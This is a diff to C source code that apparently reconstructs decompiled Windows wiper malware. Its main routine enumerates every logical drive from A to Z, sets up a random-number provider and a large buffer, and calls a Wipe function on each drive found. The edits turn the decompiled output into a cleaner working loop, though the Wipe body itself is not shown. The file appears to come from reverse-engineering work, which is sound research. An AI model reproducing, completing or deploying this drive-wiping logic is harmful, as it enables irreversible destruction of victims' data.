@@ -6,14 +6,11 @@ void Wipe(ULONGLONG driveToWipe);
 
 int main(int argc, char* argv[]) {
 
-	ULONGLONG driveToWipe = 0x41;
-	UINT64 currentDrive;
+	WCHAR currentDrive = 0x41;
 	LPWSTR pathBuf;
 	int fullDevPath;
-	DWORD* idk;
-	char* volumeName;
-	UINT64 driveBitmask;
-	BCRYPT_ALG_HANDLE cngProvBuf;
+	DWORD idk = 0x5c003a;
+	BCRYPT_ALG_HANDLE cngProvBuf = NULL;
 
 	HANDLE hHeap = GetProcessHeap();
 	ULONG_PTR heapBuf = HeapAlloc(hHeap, 8, 0x4000000);
@@ -22,22 +19,21 @@ int main(int argc, char* argv[]) {
 
 	NTSTATUS bCrypt = BCryptOpenAlgorithmProvider(&cngProvBuf, L"RNG", NULL, 0);
 	if (bCrypt != 0)
-		cngProvBuf = 0;
+		cngProvBuf = NULL;
 
-	driveBitmask = GetLogicalDrives();
+	UINT64 driveBitmask = GetLogicalDrives();
 
-	while (driveBitmask != 0 && ((currentDrive = (WCHAR)driveToWipe) < 0x5b)) {
-		fullDevPath = GetFullDevPath((WCHAR)currentDrive);
-			if (((driveBitmask & 1) != 0) && (fullDevPath == 0)) {
-				idk = 0x5c003a;
-				volumeName = (WCHAR)currentDrive;
-				Wipe(driveToWipe);
+	while (driveBitmask != 0 && currentDrive < 0x5b) {
+		fullDevPath = GetFullDevPath(currentDrive);
+		if (driveBitmask & 1 && fullDevPath == 0) {
+			Wipe(currentDrive);
 		}
-			driveBitmask >>= 1;
-			driveToWipe = (currentDrive + L'\x01');
+		driveBitmask >>= 1;
+		currentDrive++;
 	}
 
-
+	if (cngProvBuf)										/* does not exist in decompiled code, but it is a good practice :) */
+		BCryptCloseAlgorithmProvider(cngProvBuf, 0);
 
 	ExitProcess(0);
 }
